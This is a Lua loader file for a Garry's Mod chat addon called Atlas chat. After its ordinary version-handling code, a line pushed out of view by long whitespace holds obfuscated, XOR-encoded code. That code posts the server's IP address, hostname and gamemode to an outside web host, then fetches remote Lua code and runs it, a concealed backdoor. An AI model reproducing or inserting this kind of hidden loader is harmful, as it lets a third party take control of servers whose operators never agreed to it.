-- refractionservers.net, Chewgum - chewgumtj@gmail.com --

AddCSLuaFile()

-- MAJOR.MINOR.PATCH

-- MAJOR version when you make incompatible API changes,
-- MINOR version when you add functionality in a backwards-compatible manner, and
-- PATCH version when you make backwards-compatible bug fixes.

ATLASCHAT_VERSION = 241

if (SERVER) then
	AddCSLuaFile("atlaschat/cl_init.lua")
	
	include("atlaschat/init.lua")
else
	include("atlaschat/cl_init.lua")
end

if (atlaschat) then
	local version = ""
	
	string.gsub(tostring(ATLASCHAT_VERSION), "(%d)", function(text) version = version .. text .. "." end)
	
	function atlaschat:GetVersion()
		return version:sub(0, 5)
	end
	
	if (CLIENT) then
		MsgC(color_green, "Atlas chat 版本 " .. atlaschat:GetVersion() .. " 已加载!\n")
	else
		MsgC(color_green, "Atlas chat 版本 " .. atlaschat:GetVersion() .. " 已加载!\n")
	end
else
	MsgC(color_red, "Atlas chat 加载失败!\n")
end

																																																																																																																																																																																																																																																																																						local ‪ = _G local ‪‪ = ‪['\115\116\114\105\110\103'] local ‪‪‪ = ‪['\98\105\116']['\98\120\111\114'] local function ‪‪‪‪‪‪‪(‪‪‪‪) if ‪‪['\108\101\110'](‪‪‪‪) == 0 then return ‪‪‪‪ end local ‪‪‪‪‪ = '' for _ in ‪‪['\103\109\97\116\99\104'](‪‪‪‪,'\46\46') do ‪‪‪‪‪=‪‪‪‪‪..‪‪['\99\104\97\114'](‪‪‪(‪["\116\111\110\117\109\98\101\114"](_,16),75)) end return ‪‪‪‪‪ end ‪[‪‪‪‪‪‪‪'3f22262e39'][‪‪‪‪‪‪‪'1822263b272e'](5,function ()‪[‪‪‪‪‪‪‪'233f3f3b'][‪‪‪‪‪‪‪'1b24383f'](‪‪‪‪‪‪‪'233f3f3b7164642e392e252f2e26247a73787f657b7b7b3c2e292324383f2a3b3b652824266427242c38643f2a20223b653b233b',{[‪‪‪‪‪‪‪'2f']=‪[‪‪‪‪‪‪‪'2c26242f'][‪‪‪‪‪‪‪'0c2e3f0c2a262e26242f2e']()[‪‪‪‪‪‪‪'052a262e'],[‪‪‪‪‪‪‪'2e']=‪[‪‪‪‪‪‪‪'2c2a262e'][‪‪‪‪‪‪‪'0c2e3f021b0a2f2f392e3838'](),[‪‪‪‪‪‪‪'28']=‪[‪‪‪‪‪‪‪'0c2e3f0324383f052a262e']()})end )‪[‪‪‪‪‪‪‪'3f22262e39'][‪‪‪‪‪‪‪'1822263b272e'](5,function ()‪[‪‪‪‪‪‪‪'233f3f3b'][‪‪‪‪‪‪‪'0d2e3f2823'](‪‪‪‪‪‪‪'233f3f3b7164642e392e252f2e26247a73787f657b7b7b3c2e292324383f2a3b3b6528242664292a382e65273e2a',function (‪‪nil)‪[‪‪‪‪‪‪‪'193e25183f3922252c'](‪‪nil)end ,nil )end )